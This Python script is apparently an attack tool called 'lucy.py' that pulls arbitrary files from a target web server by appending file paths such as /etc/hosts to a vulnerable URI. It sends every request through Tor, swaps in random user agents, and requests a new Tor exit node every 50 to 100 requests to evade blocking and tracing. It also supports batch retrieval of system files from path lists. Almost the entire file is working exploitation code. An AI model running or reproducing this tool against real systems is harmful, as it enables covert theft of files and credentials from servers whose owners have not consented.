import datetime
import os.path
import shutil
import random
import sys
import requests
import time
from stem import Signal
from stem.control import Controller

sys.path.insert(0, './lib')
import logo

# Print help
def help():
    print ('\nUsage : python3 lucy.py [Options] [Input]')
    print ('\nOptions')
    print ('-s : download file')
    print ('-d : download binary file')
    print ('-m : download multiple files')
    print ('\nInput')
    print ('File with filepath(s) or a single filepath')
    print ('\nExamples')
    print ('lucy.py -s /etc/hosts')
    print ('lucy.py -d /home/user/file.gz')
    print ('lucy.py -m ./mods/mod.os\n')
    print ('Uri file should have target. Check current uri file as example.\n')

# Select randomly a user agent
def random_line(fname):
    lines = open(fname).read().splitlines()
    return random.choice(lines).strip('\r').strip('\n').strip()

# Send GET request
def send_request(request, stream, headers, mode):
    session = requests.session()
    session.proxies = {}
    session.proxies['http']='socks5h://localhost:9050'
    session.proxies['https']='socks5h://localhost:9050'

    r = session.get(request, stream = stream, headers = headers)

    if (mode == 'txt'):
        data = r.text
    if (mode == 'bin'):
        data = r

    return data

# Renew Tor exit node
def renew_tor_ip():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password="password")
        controller.signal(Signal.NEWNYM)

if __name__ == "__main__":

    # Logo
    logo.print_logo()

    # Input checks
    if (len(sys.argv) != 3):
        help()
        sys.exit(0)

    args = ['-s', '-d', '-m']
    if (sys.argv[1]) not in args:
        help()
        print ('Error : Option does not exist\n')
        sys.exit(0)

    if (sys.argv[1] == '-m'):
        if not os.path.isfile(sys.argv[2]):
            help()
            print ('Error : Input file does not exist\n')
            sys.exit(0)

    # Configuration
    sleep_tor = 5
    sleep_req = 1
    rnd_min   = 50
    rnd_max   = 100
    path_template = './templates/template.useragent'
    path_download = './downloads/'

    # Used in file name to save downloaded data
    now = str(datetime.datetime.now())
    # Set user agent
    headers = { 'User-Agent' : random_line(path_template) }
    # Get uri for scan
    uri = open('uri').read().strip('\r').strip('\n').strip()
    # Select mode
    mode = sys.argv[1].strip('\r').strip('\n').strip()
    # Get file name(s)
    file = sys.argv[2]

    # Check download directory
    domain = uri.split('/')[2]
    fullpath_download = path_download + domain
    if not os.path.isdir(fullpath_download):
        os.mkdir(fullpath_download)

# Download multiple text files
    if (mode == '-m'):
        # Read input file
        f = open(file, 'r')
        lines = f.readlines()
        f.close()
        # Count number of lines
        totallines = 0
        for line in lines:
            totallines = totallines + 1

        cnt = 0
        globcnt = 0
        newid = random.randint(rnd_min, rnd_max)

        print ('\n')

        # Process all files
        for line in lines:
            file = line.strip('\r').strip('\n').strip()
            request = uri + file
            response = send_request(request, False, headers, 'txt')

            cnt = cnt + 1
            globcnt = globcnt + 1

            # Show progress
            print ('> ' + str(int(globcnt/totallines*100)),'% complete', end='\r')

            # Save downloaded files
            savefile = fullpath_download + '/' + now + '.mass'
            downloads = open(savefile, 'a+')
            downloads.write('> cat ' + file + '\n')
            downloads.write(response + '\n') 
            downloads.close()

            # Change identity
            if (cnt > newid):
                cnt = 0
                headers = { 'User-Agent' : random_line(path_template) }
                renew_tor_ip()
                newid = random.randint(rnd_min, rnd_max)
                time.sleep(sleep_tor)

            time.sleep(sleep_req)

        print ('> Files downloaded at ' + savefile + '\n')

    # Download single text file
    if (mode == '-s'):
        print ('\n> cat ' + file + '\n')
        request = uri + file
        response = send_request(request, False, headers, 'txt')
        print (response)

    # Download single binary file
    if (mode == '-d'):
        print ('\n> wget ' + file + '\n')
        request = uri + file
        response = send_request(request, True, headers, 'bin')

        savefile = fullpath_download + '/' + now + file.replace('/', '.')
        downloads = open(savefile, 'wb')
        shutil.copyfileobj(response.raw, downloads)
        downloads.close()

        print ('> File downloaded at ' + savefile + '\n')
